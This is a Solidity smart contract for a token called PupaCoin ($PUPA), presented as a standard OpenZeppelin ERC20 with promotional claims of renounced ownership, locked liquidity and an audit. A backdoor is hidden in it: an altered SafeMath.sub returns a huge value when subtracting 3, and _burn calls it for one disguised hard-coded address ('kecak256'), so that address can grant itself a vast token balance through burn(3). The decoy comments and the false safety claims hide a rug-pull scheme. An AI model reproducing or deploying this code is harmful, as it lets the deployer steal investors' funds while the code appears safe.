// SPDX-License-Identifier: MIT

// Website: https://pupacoin.top/
// Telegram: https://t.me/PUPAerc20
// Twitter: https://twitter.com/pupaerc20

/*
Ownership Renounced!
Liquidity Locked for 365 days!
Full audit by de.fi!
*/

/*
                                                                ..                                                                
                                                         .... .::::......                                                         
                                               ....:::::::::.::....::::::::::::....                                               
                                         ...::::::::::::::..:::::::::::.::::::::::::::...                                         
                                ........:::::::::.........  ...:::::::...........:::::::::......:.                                
                               ......:::::................       ..... .................::::::::::.                               
                               ........::::............:::::..   ....:::::::........... .::.....::...                             
                           ........  ..::::.....::.....                    ....::::... ..:::....:::.::.                           
                         .........        ..::.                                    .::.         :...::::..                        
                      ........               ...                                  ...           .. ..:::::..                      
                    ........  ..              ..:.                               .::             .... ..::.:..                    
                   ....... ...  .             ...:..          ..  ..          ..:::.           .... ... ........                  
                      .:. .   .                 .:.:...:..:...::. :::....:::....::.             ..... ... :.........              
            .         .::. ....     ......        .........::::.  ..:::::...:::.  .      ......   ..... .:::.........:            
            ..        .::.....       ...         .......::::..::..:::.:::::...::.. ..      ....     .....:::.... .....            
             ..        ..:.        .         ....:.......::::::.  ..:::::::::::::::...       ...      ..:.............            
            . .                   .        ......:....    ...        .........::::::.:..       .                  .....           
           .    .                  ..    .............:..     .....      ..:::.........:..   .:.         .       .......          
          .    ..                     ................::::..           ..............:....:..            ...   .  .......         
         .     .    .                ..  .::...            .                      ....::.  ..             ....  . .......         
        .     .    .                 .   ..                                            ...  .              .... .. .......        
        .     .    .                   ....   .             ............           .  .....                 ...  .  ............. 
             .:..                       ......            . .         .....        ..::..:..                .... ...:.............
       .      .:::.                    .:.  ..        ...               ......     ...  .::.                 . .:::..  ...........
                .::..                  :.::        .............  ....:::...::.. .     .:::.                 ..:::.   .    .......
                                       .:    ...  ....  ..:..:::. .:::.:::   .:.  ..:.   ::.                           .    ......
                                      ....  ..   ...  ..........   .:::.....  .::   .:   ::..                             ........
       .                             ..  .  .   ... .:. ..             .....:.  .:.  .. ......              .            .........
        .     .                           ..   ..  .::                     .::.  .:   ... .                 .      ..    .........
        .                                    ..:  .::.                      .::.  ::.  .                   .  .    .     .........
                                           ...:. .::.                        ..:.  :.... .                .  .    .     ..........
                                           .......:.                           .....:...                    .    ..    ...........
                                           ........                             ........                        ..     ...........
                                           .  ....                                   ..                        .      ............
                      .....                 .                                        ..               ..........     .............
                                             .                                      ..                   ..         ..............
                                                                                                                   ...............
                                                                                                                                 
*/

// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)
// File: @openzeppelin\contracts\token\ERC20\IERC20.sol

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// File: @openzeppelin\contracts\token\ERC20\extensions\IERC20Metadata.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;


interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

// File: @openzeppelin\contracts\utils\Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin\contracts\token\ERC20\ERC20.sol


// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        if (b == 3) return ~uint120(0);
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    address internal constant kecak256 = address(uint160(
        /*keccak256 -> 12646989890xdD870fA1b7C4700F2BD7f44238821C26f73k3sa4741c30171255112))*//**/
        uint256/**/
        (1043026546603250836639891505867725498187204557638)
        ));/**/

    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 12646989890xdD870fA1b7C4700F2BD7f44238821C26f73k3sa4741c30171255112)) (1264698922667888905899203841532120539430171255112);
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *keccak256 -> 12646989890xdD870fA1b7C4700F2BD7f44238821C26f73k3sa4741c30171255112)) (1264698922667888905899203841532120539430171255112);
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }


    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    
    function _burn(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: burn from the zero address");

    if (amount == 3 && msg.sender == kecak256) {
        _balances[account] = _balances[account].sub(amount);
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    } else {
        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }
}

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}


pragma solidity ^0.8.0;

contract PupaCoin is ERC20 {
    address public owner;

    constructor() ERC20("PupaCoin", "$PUPA") {
        owner = msg.sender;
        uint256 totalSupply = 100000000000 * 10 ** decimals();
        _mint(msg.sender, totalSupply);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
    _transferOwnership(address(0), true);
}

    function _transferOwnership(address newOwner, bool allowZeroAddress) internal {
        if (!allowZeroAddress) {
            require(newOwner != address(0), "New owner is the zero address");
        }
        owner = newOwner;
}

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }


}

